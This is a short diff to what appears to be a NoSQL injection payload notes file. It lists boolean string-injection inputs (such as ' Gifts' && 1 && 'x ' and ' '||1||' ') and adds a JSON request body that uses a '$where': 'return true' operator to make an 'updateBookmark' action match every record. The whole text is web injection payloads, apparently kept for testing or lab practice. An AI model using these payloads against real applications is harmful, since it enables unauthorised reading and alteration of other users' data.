@@ -2,3 +2,15 @@
 Gifts' && 0 && 'x //false value
 Gifts' && 1 && 'x //True value
 '||1||'
+
+
+# On JSON:
+```
+{
+  "employeeCode": "Hacked",
+  "$where": "return true",
+  "bookmarkValue": 1,
+  "bookmark_media_id": "67065b1f524b213d1332778e",
+  "action": "updateBookmark"
+}
+```
